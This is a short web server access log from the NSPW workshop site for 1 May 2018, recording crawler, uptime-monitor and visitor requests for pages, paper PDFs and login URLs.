www.nspw.org:80 137.175.151.77 - - [01/May/2018:15:58:57 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 180.76.15.135 - - [01/May/2018:15:59:20 -0400] "GET /papers/2011/nspw2011-gutmann.pdf HTTP/1.1" 302 556 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 84.139.112.1 - - [01/May/2018:16:00:08 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 84.139.112.1 - - [01/May/2018:16:00:09 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:16:00:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 180.76.15.21 - - [01/May/2018:16:01:20 -0400] "GET /proceedings/2008 HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 180.76.15.163 - - [01/May/2018:16:04:20 -0400] "GET /papers/2009/?C=N;O=A HTTP/1.1" 302 532 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 180.76.15.34 - - [01/May/2018:16:05:20 -0400] "GET /2009/proceedings/1999/nspw1999-henning.pdf HTTP/1.1" 302 576 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:16:05:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 35.224.63.232 - - [01/May/2018:16:05:59 -0400] "GET /papers/1993/nspw1993-meadows.pdf HTTP/1.1" 302 537 "-" "Python/3.5 aiohttp/3.1.3"
www.nspw.org:80 54.36.149.81 - - [01/May/2018:16:06:11 -0400] "GET /2008/cfp/ HTTP/1.1" 302 491 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 180.76.15.22 - - [01/May/2018:16:06:20 -0400] "GET /2004/?C=N;O=D HTTP/1.1" 302 518 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
www.nspw.org:80 79.118.145.178 - - [01/May/2018:16:07:43 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 79.118.145.178 - - [01/May/2018:16:07:46 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 216.244.66.200 - - [01/May/2018:16:09:31 -0400] "GET /robots.txt HTTP/1.1" 302 493 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 69.162.124.227 - - [01/May/2018:16:10:34 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 185.130.184.223 - - [01/May/2018:16:10:43 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
www.nspw.org:80 185.130.184.223 - - [01/May/2018:16:10:43 -0400] "GET /user/login HTTP/1.1" 302 489 "http://nspw.org/user/login" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0"
